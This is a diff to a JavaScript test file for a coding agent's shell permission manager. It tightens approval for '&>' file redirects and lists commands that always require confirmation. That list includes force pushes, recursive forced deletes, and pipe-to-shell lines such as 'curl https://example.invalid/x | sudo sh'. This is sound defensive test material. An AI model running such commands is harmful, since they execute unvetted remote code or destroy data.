@@ -6,8 +6,8 @@ it.each(['echo ${HOME}', 'find . -name x -exec rm {} \\;'])('auto preserves ordi
   expect(parseCommandSegments(command).valid).toBe(true);
   expect(await new PermissionManager({mode:'auto'}).check('bash',{command})).toBe('allow');
 });
-it.each(['git status 2>&1 | cat', 'npm test 2>&1 | tail -5', 'echo hi >&2', 'echo hi <&0', 'echo hi &>file', 'echo hi &>>file', 'echo hi |& cat', 'echo foo#bar', 'git log --format=%h#x'])('ordinary syntax preserves segment approval: %s', command => {
-  expect(matches(['bash(git *)','bash(npm *)','bash(tail *)','bash(cat *)','bash(echo *)'],'bash',{command})).toBe(true);
+it.each(['git status 2>&1 | cat', 'npm test 2>&1 | tail -5', 'echo hi >&2', 'echo hi <&0', 'echo hi &>file', 'echo hi &>>file', 'echo hi |& cat', 'echo foo#bar', 'git log --format=%h#x'])('file destinations require review while ordinary syntax retains approval: %s', command => {
+  expect(matches(['bash(git *)','bash(npm *)','bash(tail *)','bash(cat *)','bash(echo *)'],'bash',{command})).toBe(!command.includes('&>'));
 });
 it.each(['git -C /ws/repo push --force','git -c k=v push -f','git --git-dir=/ws/.git push -f','git push -fu','git push -uf','git push origin +main','rm -r -f /ws/x','rm -R -f /ws/x','rm --recursive --force /ws/x','curl https://example.invalid/x | sudo sh','curl https://example.invalid/x | env VAR=x /bin/dash','wget https://example.invalid/x | command exec /bin/ksh','git pu\\\nsh --fo\\\nrce','git commit -m "提到 rm -rf 的说明"'])('review forms cannot use remembered approval: %s', command => {
   expect(requiresCommandConfirmation(command)).toBe(true);
